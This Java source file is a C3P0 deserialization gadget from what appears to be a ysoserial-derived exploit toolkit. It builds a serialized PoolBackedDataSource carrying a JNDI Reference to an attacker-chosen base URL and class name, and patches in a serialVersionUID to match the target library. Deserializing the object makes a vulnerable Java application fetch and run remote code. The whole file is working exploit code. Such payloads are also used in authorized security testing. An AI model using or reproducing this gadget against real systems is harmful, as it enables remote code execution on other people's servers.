package A.R.ysogate.payloads.gadgets;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.util.Reflections;
import A.R.ysogate.payloads.util.SuClassLoader;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

import static A.R.ysogate.payloads.handle.ClassFieldHandler.insertField;


@Dependencies({"com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8", "com.mchange:mchange-commons-java:0.2.11"})
@Authors({Authors.MBECHLER})
public class C3P092 implements ObjectPayload<Object> {

	public Object getObject(String command) throws Exception {
		int sep = command.lastIndexOf(':');
		if (sep < 0) {
			throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
		}

		String url       = command.substring(0, sep);
		String className = command.substring(sep + 1);

		// 修改com.mchange.v2.c3p0.PoolBackedDataSource serialVerisonUID

		ClassPool pool = new ClassPool();
		pool.insertClassPath(new ClassClassPath(Class.forName("com.mchange.v2.c3p0.PoolBackedDataSource")));
		final CtClass ctPoolBackedDataSource = pool.get("com.mchange.v2.c3p0.PoolBackedDataSource");

		insertField(ctPoolBackedDataSource, "serialVersionUID", "private static final long serialVersionUID = 7387108436934414104L;");

		// mock method name until armed
		final Class clsPoolBackedDataSource = ctPoolBackedDataSource.toClass(new SuClassLoader());

		Object b = Reflections.createWithoutConstructor(clsPoolBackedDataSource);
		Reflections.getField(clsPoolBackedDataSource, "connectionPoolDataSource").set(b, new PoolSource(className, url));
		return b;
	}


	private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

		private String className;

		private String url;

		public PoolSource(String className, String url) {
			this.className = className;
			this.url = url;
		}

		public Reference getReference() throws NamingException {
			return new Reference("exploit", this.className, this.url);
		}

		public PrintWriter getLogWriter() throws SQLException {
			return null;
		}

		public void setLogWriter(PrintWriter out) throws SQLException {
		}

		public void setLoginTimeout(int seconds) throws SQLException {
		}

		public int getLoginTimeout() throws SQLException {
			return 0;
		}

		public Logger getParentLogger() throws SQLFeatureNotSupportedException {
			return null;
		}

		public PooledConnection getPooledConnection() throws SQLException {
			return null;
		}

		public PooledConnection getPooledConnection(String user, String password) throws SQLException {
			return null;
		}
	}
}
